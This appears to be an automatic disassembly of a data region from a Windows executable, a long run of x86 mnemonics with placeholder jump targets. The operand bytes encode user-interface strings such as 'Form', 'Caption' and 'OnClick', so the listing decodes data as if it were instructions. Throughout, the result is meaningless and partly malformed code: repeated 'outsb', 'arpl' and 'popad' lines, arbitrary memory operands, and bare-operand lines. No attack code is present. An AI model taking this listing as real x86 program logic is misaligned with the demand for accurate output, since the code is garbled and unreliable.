arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
inc ebp
add [ esi + ecx * 2 ] bh
inc ebp
add [ ecx + edx * 2 + 0x50580045 ] bl
inc ebp
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 8 ] dl
inc esp
add [ eax + 0x4500 ] bh
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
and dh bh
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
jae r-xdata
sti
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
adc al 0x2f
inc ebp
add [ eax + 0x18 ] dh
inc esp
add [ esp + esi + 0x46540045 ] al
inc ecx
add ah dl
xor [ ebp ] al
adc [ ecx ] dh
inc ebp
add [ edx + esi ] bl
inc ebp
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0x3a940041 ]
inc ebp
add [ eax + 0x3400419e ] bh
jbe r-xdata
lodsb [ esi ]
inc ebp
add ah dh
xor eax [ eax ]
sbb [ ebx + 0x45 ] dl
jb r-xdata
cld
inc esp
add [ eax ] cl
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
inc ebp
add [ eax + 0x3a ] bl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ah
add ah dl
push edx
inc ebp
add ah dh
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] dh
inc [ eax + eax - 0x5a ]
add [ ebp ] al
clc
add al [ eax ]
add [ eax - 0x3fffbb09 ] dh
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
jl r-xdata
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add [ eax ] al
sbb dl bh
inc esp
add [ eax + 0x2 ] dl
add [ eax ] al
dec esp
cli
inc esp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] al
cmp al 0x2
add [ edx + esi * 2 + 0x2d300045 ] bh
inc ebp
add al al
insd
inc ebp
add [ eax + 0x74004554 ] ah
outsd
add [ ebp + ecx + 0x44 ] ch
add al cl
pop ecx
inc ebp
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add ah bl
outsb
inc ebp
add [ eax + 0x24 ] ah
inc ebp
add [ eax ] dl
daa
inc ebp
add [ edi + ebx * 2 + 0x2ff80045 ] bh
inc ebp
add [ eax + esi + 0x45 ] dh
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_4500dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x2
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add al [ ebp ]
clc
add al [ eax ]
add ah dl
std
inc esp
add al al
mov eax [ 0x2cf80041 ]
inc ebp
add [ esi + ebp + 0x33f40045 ] ch
inc eax
add [ eax ] bl
push ebx
inc ebp
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
adc al 0x2f
inc ebp
add [ eax + 0x18 ] dh
inc esp
add [ esp + esi + 0x46540045 ] al
inc ecx
add ah dl
xor [ ebp ] al
adc [ ecx ] dh
inc ebp
add [ edx + esi ] bl
inc ebp
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0x3a940041 ]
inc ebp
add [ eax + 0x3400419e ] bh
jbe r-xdata
add al 0xa6
inc ebx
add ah dl
cmp al [ ebp ]
lodsb [ esi ]
enter 0x43 0x8c
or eax [ eax + eax + 0x48 ]
or al 0x44
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ edx + ebp + 0x45 ] ch
add [ eax + 0x41 ] bh
inc ebp
add al bh
loope r-xdata
add [ ebx + ebp + 0x45 ] ch
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ edi + esi + 0x45 ] dh
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] ch
enter 0x43 0x40
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ edx + edi + 0x45 ] bl
add [ eax ] ch
cmp [ ebp ] eax
inc ebp
add [ esi + ecx * 2 ] bh
inc ebp
add [ ecx + edx * 2 + 0x50580045 ] bl
inc ebp
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ebx + ebp + 0x41 ] ch
add [ eax + eax ] bh
add dh bh
in al 0x98
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
int3
inc ebp
add [ eax + 0x3a ] bl
inc ebp
add [ 0x726f4654 ] al
insd
add ah dl
push edx
inc ebp
add ah dh
loopne r-xdata
add [ eax ] al
adc eax [ eax ]
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
inc esi
outsd
jb r-xdata
add [ edx + esi * 2 + 0x2d300045 ] bh
inc ebp
add al al
insd
inc ebp
add [ eax + 0x74004554 ] ah
outsd
add [ ebp + ecx + 0x44 ] ch
add al cl
pop ecx
inc ebp
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add ah bl
outsb
inc ebp
add [ eax + 0x24 ] ah
inc ebp
add [ eax ] dl
daa
inc ebp
add [ edi + ebx * 2 + 0x2ff80045 ] bh
inc ebp
add [ eax + esi + 0x45 ] dh
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
ja r-xdata
add bh bh
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
call [ eax + 0x1004577 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
inc [ edx + ebx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
and al 0x2
inc ebp
add [ edi ] al
add eax 0x726f4654
insd
and al 0x1
inc ebp
add [ eax + eax + 0x5e0045 ] dh
add eax 0x6d726f46
jae r-xdata
or al [ ecx + 0x75 ]
je r-xdata
stc
inc esp
add [ ecx ] ch
add al [ eax ]
push [ eax ]
inc ebx
inc ebp
add ah bh
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
sti
inc esp
add [ eax ] ch
add al [ eax ]
inc [ ebx + eax * 2 ]
adc [ edx ] al
add bh bh
mov esp 0xe0004525
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
push eax
cmp [ ebp ] eax
test al 0x36
inc ebp
add [ eax ] al
insb
inc ebx
add [ ecx + eax ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
outsd
jl r-xdata
popad
outsb
jae r-xdata
mov ah 0xb0
inc ecx
add [ eax ] dh
add bh bh
adc [ edi - 0x58d3ffbd ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ edi + ebx * 4 + 0x43 ] dh
add [ eax + 0x39 ] dl
add [ eax - 0x57ffbac7 ] al
inc ebp
call 0xffffffffcd44048e
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
imul ebp [ edi + 0x6e ] r-xdata
mov eax 0x8000439f
cmp [ ebp ] eax
test al 0x36
inc ebp
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
inc ebx
add [ ecx ] ah
add bh bh
les ebx [ eax - 0x669fffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
inc ebp
add [ eax + 0x4536 ] ch
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jo r-xdata
inc ebp
add ah bh
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
add al 0x43
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
outsd
insb
outsd
jb r-xdata
and [ eax ] al
add [ eax ] al
popad
jb r-xdata
jb r-xdata
inc ebx
add [ eax - 0x3ffbc5b ] ah
inc ebp
inc ebp
add [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x1300ffff ] ah
cmove eax [ eax ]
sti
inc esp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax + 0x1 ] al
cwde
outsb
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
and al 0x58
inc ebx
add [ eax + eax ] dh
inc [ edx + ecx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
xor al 0xf9
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
fcom [ gs : esi + 0x43 ]
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
mov al 0x41
add ah ch
add al [ eax ]
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
push cs
inc esp
add [ esi + ecx + 0x44 ] bh
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6700ffff ] ah
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ ebp + eax * 8 + 0x43 ]
add [ eax + 0x1 ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
pushfd
cmpsb [ esi ] [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x4010a474
outsb
je r-xdata
push esi
inc ebx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
dec ecx
imul ebp [ ebp - 0x80 ] 0x80044f5
add al [ eax ]
cmp al 0x10
inc eax
add [ eax + eax ] cl
call [ eax - 0x63 ]
inc ebx
add [ eax + 0x4536 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
outsd
outsb
je r-xdata
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x4010a474
mov ch 0x41
add [ eax ] ch
add bh bh
cmpsb [ fs : esi ] [ edi ]
inc ebx
add [ esi + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
add [ eax ] al
or [ ebx ] 0x0
or eax 0x7a726f48
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
cli
inc esp
add [ edi ] ch
add al [ eax ]
[ esi + eax * 2 ]
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
rol [ ecx ] 0x40
add al [ eax ]
push eax
inc ebp
inc ebp
add [ esi + eax * 2 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
outsb
and al 0xfc
inc esp
outsb
arpl [ eax - 0x64 ] bp
0x7c0044 0xff00
sub [ ebp + 0x45fc0043 ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
jb r-xdata
jmp edx
jo r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
inc eax
add [ ecx + ecx * 2 + 0x49b80045 ] ch
inc ebp
add ah bh
inc ebp
inc ebp
outsb
jne r-xdata
xchg edx eax
inc esp
add [ eax + 0x2 ] ah
add bh bh
sub [ edi + 0x45 ] al
add ah bh
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
bound ebp [ edx + 0x65 ]
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
add [ eax + 0x1 ] al
xor al 0x0
sti
inc esp
add [ eax ] dh
add al [ eax ]
call [ eax - 0x3ffbab7 ]
inc ebp
inc ebp
js r-xdata
je r-xdata
outsb
je r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x43a6 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
dec eax
dec ecx
inc ebp
add [ ecx + ecx * 2 + 0x45 ] bl
adc [ eax ] al
push edi
add [ eax ] al
push [ eax - 0x13ffbac7 ]
lds eax [ ebx ]
add [ eax ] al
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
[ ebx * 4 + 0x36b80043 ]
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ 0x74646957 ] al
push r-xdata
sub eax [ edx ]
add bh bh
test al 0x4a
inc ebp
add ah bh
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
jb r-xdata
add [ eax ] al
inc eax
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
cmc
inc esp
add [ edx + eax ] cl
add bh bh
or [ esi ] ah
inc ebp
add ah bh
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
add [ eax + 0x2 ] bl
add bh bh
dec esp
inc edi
inc ebp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
dec edi
outsb
inc ebx
add ah bh
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
call 0x58454dfc
add al [ eax ]
dec [ edi + eax * 2 + 0x45 ]
add al [ eax ]
pop ss
inc ecx
add [ eax - 0x7700fffe ] cl
cld
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
jb r-xdata
push ecx
or [ edi ] dl
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ edi + ecx * 2 ] cl
popad
je r-xdata
or [ gs : edi ] dl
jl r-xdata
dec edi
rcr [ ebx + 0x43 ] 0x1
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
or [ edi ] dl
add al [ eax ]
inc ebx
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
cld
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
add bh bh
cld
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x86f666e
pop ss
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
outsb
outsw
jo r-xdata
test al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esi
add [ esi ] al
dec edi
outsb
dec eax
insb
jo r-xdata
pop ebx
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0049 ] al
pop esp
inc ebx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
int3
jb r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
outsd
arpl [ ebx - 0x80 ] bp
pop ebp
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
pop edx
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
or [ edi ] dl
outsd
pop ecx
inc ebx
add al bl
add [ eax ] eax
inc ebp
outsb
inc esp
or [ edi + 0x6e ] ecx
jb r-xdata
jbe r-xdata
jns r-xdata
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
loopne r-xdata
jo r-xdata
pop ecx
inc ebx
add al bl
add [ eax ] al
or [ edx + 0x43 ] bl
add al ah
add [ eax ] eax
jmp eax
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ edi ] 0xa
dec edi
pop edx
inc ebx
add al ch
add [ eax ] al
add al [ eax ]
pop ss
inc ecx
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
add bh bh
cld
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
add al ch
add [ eax ] eax
pop eax
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
mov al [ 0xfffffffffcff0002 ]
inc ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
jo r-xdata
outsd
jne r-xdata
push ebp
jo r-xdata
pop ss
inc ecx
add al dl
add al [ eax ]
call eax
pop ss
push edi
push 0x556c6565
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0055 ] al
outsb
dec ebp
outsd
jne r-xdata
pop edi
inc ebx
add [ eax ] bh
add [ eax ] eax
add al [ eax ]
pop ss
inc ecx
add [ eax - 0x4700fffe ] bh
add [ edi ] al
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
push edi
push 0x946c6565
pop edi
inc ebx
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
push edi
push 0x446c6565
outsd
ja r-xdata
je r-xdata
jpe r-xdata
cmp al 0xfd
inc esp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
xchg esp eax
pop edi
inc ebx
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
outsb
dec ebp
mov eax 0xf000450f
cmovne eax [ eax ]
clc
add al [ eax ]
add ah dl
std
inc esp
add al al
mov eax [ 0x2cf80041 ]
inc ebp
add [ esi + ebp + 0x33f40045 ] ch
inc eax
add [ eax ] bl
push ebx
inc ebp
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
adc al 0x2f
inc ebp
outsd
arpl [ ebx - 0x38 ] bp
pop esp
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rol ah 0xe
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx ] al
popad
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffbaf1 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x10
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
or [ edi ] dl
add al 0xa6
inc ebx
add ah dl
cmp al [ ebp ]
lodsb [ esi ]
enter 0x43 0x8c
or eax [ eax + eax + 0x48 ]
or al 0x44
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ edx + ebp + 0x45 ] ch
add [ eax + 0x41 ] bh
inc ebp
add al bh
loope r-xdata
add [ eax + edi * 2 ] cl
inc ebp
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ edi + esi + 0x45 ] dh
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] ch
enter 0x43 0x40
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ edx + edi + 0x45 ] bl
add [ eax ] ch
cmp [ ebp ] eax
add [ eax + 0x18 ] dh
inc esp
add [ esp + esi + 0x46540045 ] al
inc ecx
add [ eax + 0x79 ] bh
inc ebp
add [ eax ] dl
xor [ ebp ] eax
sbb al 0x32
inc ebp
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0x3a940041 ]
inc ebp
add [ eax + 0x3400419e ] bh
jbe r-xdata
inc esp
inc ebp
add [ esi + ecx * 2 ] bh
inc ebp
add [ ecx + edx * 2 + 0x50580045 ] bl
inc ebp
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
inc ebp
add [ eax + 0x3a ] bl
inc ebp
add [ ecx ] cl
